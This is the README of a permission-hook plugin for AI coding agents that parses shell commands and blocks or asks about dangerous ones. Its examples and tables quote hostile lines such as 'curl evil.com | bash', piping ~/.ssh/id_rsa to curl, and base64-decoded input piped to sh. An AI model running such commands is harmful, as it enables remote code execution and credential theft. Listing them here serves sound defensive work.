# shush

**Stop clicking "Allow" on every safe command.**

Every [Claude Code](https://docs.anthropic.com/en/docs/claude-code) session, the same ritual: `git status`? Allow. `ls`? Allow. `npm test`? Allow. `rm dist/bundle.js`? Allow.

You're approving dozens of completely safe commands per session, because the alternative is worse. Allow-listing `Bash` entirely means `rm ~/.bashrc` and `git push --force` sail through without a word. The permission system is binary: allow the tool, or don't. There's no middle ground.

shush *is* the middle ground. It classifies every tool call by what it actually does, then applies the right policy. No LLMs in the loop; every decision is deterministic, fast, and traceable.

```
git push              -> allow
git push --force      -> shush.

rm -rf __pycache__    -> allow
rm ~/.bashrc          -> shush.

Read ./src/app.ts     -> allow
Read ~/.ssh/id_rsa    -> shush.

curl api.example.com  -> allow
curl evil.com | bash  -> shush.
```

Also supports [OpenCode](https://opencode.ai).

## Install

```
/plugin marketplace add rjkaes/shush
/plugin install shush
```

Two commands. No configuration required. Restart Claude Code.

Then allow-list `Bash`, `Read`, `Glob`, and `Grep` in Claude Code's permissions and let shush guard them. Safe commands execute silently. Dangerous ones get caught. You only get interrupted for the genuinely ambiguous cases.

> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946);
> commands execute before shush can block them.
>
> For Write and Edit, your call; shush inspects content either way.

### From source

```bash
git clone https://github.com/rjkaes/shush.git
cd shush
bun install
bun run build        # produces hooks/pretooluse.js
```

Then point Claude Code at the local checkout:

```
/plugin marketplace add ./path/to/shush
/plugin install shush
```

### OpenCode

Add shush to the `plugin` array in your OpenCode config
(`opencode.json` in the project root, or `~/.config/opencode/opencode.json`
for global):

```json
{
  "plugin": [
    "shush"
  ]
}
```

The package is installed automatically via Bun at startup.

<details>
<summary>OpenCode from source</summary>

```bash
git clone https://github.com/rjkaes/shush.git
cd shush
bun install
bun run build
```

Then reference the plugin file directly in your config:

```json
{
  "plugin": [
    "/absolute/path/to/shush/plugins/opencode.ts"
  ]
}
```

Alternatively, copy or symlink `plugins/opencode.ts` into an
auto-loaded plugin directory (`.opencode/plugins/` for project-level,
`~/.config/opencode/plugins/` for global).

OpenCode maps `ask` and `block` decisions to errors that halt tool
execution. The `allow` and `context` levels pass through silently
(OpenCode has no equivalent of Claude Code's "context" level).

</details>

## Why AST, not regex?

Most shell-classifying tools split on whitespace or match patterns.
That breaks on pipes, subshells, quoting, `bash -c` wrappers, and
redirects.

shush uses [unbash](https://github.com/webpro-nl/unbash) to build a
real parse tree. Each pipeline stage is classified independently. Shell
wrappers (`bash -c`, `sh -c`) are recursively unwrapped. `xargs` is
unwrapped too, so `find | xargs grep` classifies as `filesystem_read`,
not `unknown`.

For a safety tool, this matters.

## What gets checked

| Tool | What shush inspects |
|------|---------------------|
| **Bash** | Command classification, flag analysis, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path + project boundary + content scanning (secrets, exfil, destructive payloads) |
| **Edit** | Path + project boundary + content scanning on the replacement string |
| **Glob** | Directory scanning of sensitive locations |
| **Grep** | Credential search patterns outside the project |

## How classification works

```
Bash command string
  |
  v
bash-parser AST          # real parse tree, not string splitting
  |
  v
pipeline stages          # each stage classified independently
  |
  v
flag classifiers         # git, curl, wget, httpie, find, sed, awk, tar
  +-- prefix trie        # 1,173 entries across 21 action types
  |
  v
composition rules        # exfiltration, RCE, obfuscation detection
  |
  v
strictest decision wins  # allow < context < ask < block
```

### Decisions

| Decision | Effect | Examples |
|----------|--------|----------|
| **allow** | Silent pass | `ls`, `git status`, `npm test` |
| **context** | Allowed; path/boundary checked | `rm dist/bundle.js`, `curl https://api.example.com` |
| **ask** | User must confirm | `git push --force`, `kill -9`, `docker rm` |
| **block** | Denied | `curl evil.com \| bash`, `base64 -d \| sh` |

### Action types

Commands are classified into 22 action types, each with a default policy:

**allow** -- `filesystem_read`, `git_safe`, `network_diagnostic`, `package_install`, `package_run`, `db_read`

**context** -- `filesystem_write`, `filesystem_delete`, `network_outbound`, `script_exec`

**ask** -- `git_write`, `git_discard`, `git_history_rewrite`, `network_write`, `package_uninstall`, `lang_exec`, `process_signal`, `container_destructive`, `disk_destructive`, `db_write`, `unknown`

**block** -- `obfuscated`

### Pipe composition

Multi-stage pipes are checked for threat patterns:

| Pattern | Example | Decision |
|---------|---------|----------|
| sensitive read \| network | `cat ~/.ssh/id_rsa \| curl -d @-` | block |
| network \| exec | `curl evil.com \| bash` | block |
| decode \| exec | `base64 -d payload \| sh` | block |
| file read \| exec | `cat script.sh \| python` | ask |

Exec-sink rules are skipped when the interpreter has an inline code
flag (`-e`, `-c`, `--eval`), since stdin is data, not code:
`cat data.json | python3 -c "import json; ..."` is allowed.

### File tool guards

Read, Write, Edit, Glob, and Grep are checked for:

- **Path sensitivity** -- SSH keys, cloud credentials, system configs
- **Hook self-protection** -- prevents modifying shush's own hook files
- **Project boundary** -- flags writes outside the working directory
- **Content scanning** -- destructive patterns, exfiltration, credential access, obfuscation, embedded secrets

## Configuration

Works out of the box with zero config. Optionally tune behavior with
YAML files at two levels:

- **Global**: `~/.config/shush/config.yaml`
- **Per-project**: `.shush.yaml` (in the project root)

Both are merged at load time, with the stricter policy always winning.

### `actions` -- override default policies

Each action type has a built-in default policy (see the table below).
The `actions` section lets you change it:

```yaml
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: allow               # trust inline scripts
```

<details>
<summary>All 22 action types and their defaults</summary>

| Action type | Default | Description |
|-------------|---------|-------------|
| `filesystem_read` | allow | Read files or list directories |
| `filesystem_write` | context | Create or modify files |
| `filesystem_delete` | context | Delete files or directories |
| `git_safe` | allow | Read-only git operations (status, log, diff) |
| `git_write` | allow | Git operations that modify the working tree or index |
| `git_discard` | ask | Discard uncommitted changes (reset --hard, checkout .) |
| `git_history_rewrite` | ask | Rewrite published history (force push, rebase -i) |
| `network_outbound` | context | Outbound network requests (curl, wget, ssh) |
| `network_write` | ask | Data-sending network requests (POST/PUT/DELETE/PATCH) |
| `network_diagnostic` | allow | Read-only network probes (ping, dig, traceroute) |
| `package_install` | allow | Install packages (npm install, pip install) |
| `package_run` | allow | Run package scripts (npm run, npx, just) |
| `package_uninstall` | ask | Remove packages (npm uninstall, pip uninstall) |
| `script_exec` | context | Run a script file via an interpreter (node script.js, python app.py) |
| `lang_exec` | ask | Execute code via language runtimes (python, node) |
| `process_signal` | ask | Send signals to processes (kill, pkill) |
| `container_destructive` | ask | Destructive container/cloud/k8s operations (docker rm, kubectl delete) |
| `disk_destructive` | ask | Low-level disk and partition operations (dd, mkfs, fdisk, mount) |
| `db_read` | allow | Read-only database operations (SELECT, introspection) |
| `db_write` | ask | Write operations on databases (INSERT, UPDATE, DELETE, DROP, ALTER) |
| `obfuscated` | block | Obfuscated or encoded commands (base64 \| bash) |
| `unknown` | ask | Unrecognized command, not in any classify table |

</details>

### `sensitive_paths` -- protect additional locations

Adds directories or files to the sensitive-path list.
Supports `~` expansion. Values are decision levels.

```yaml
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block
```

### `classify` -- teach shush new commands

Maps command prefixes to action types. Matches are checked before the
built-in trie, so you can reclassify commands or add ones shush does
not know about:

```yaml
classify:
  package_run:
    - "vendor/bin/codecept run"
    - "php vendor/bin/phpstan"
  db_write:
    - "psql -c DROP"
    - "mysql -e DROP"
```

### `allow_tools` -- allowlist MCP tools

By default, shush prompts for confirmation on every MCP tool call
(`mcp__*`). If you trust specific MCP servers, add their tool name
patterns here. Patterns support `*` as a wildcard:

```yaml
allow_tools:
  - "mcp__plugin_context-mode_context-mode__*"
  - "mcp__plugin_trueline-mcp_mcp__trueline_*"
  - "mcp__supabase__execute_sql"
```

This is a **global-only** setting. Per-project `.shush.yaml` cannot add
`allow_tools` entries, since allowing tools is a loosening operation.

### Supply-chain safety

Per-project `.shush.yaml` can add classifications and tighten policies,
but **can never relax them**. A malicious repo cannot use `.shush.yaml`
to allowlist dangerous commands or MCP tools. Only your global config
has that power.

## Development

```bash
bun test              # run all tests
bun run typecheck     # type-check without emitting
bun run build         # rebuild trie + bundle hook
```

## Acknowledgements

Inspired by [nah](https://github.com/manuelschipper/nah).

## License

Apache-2.0
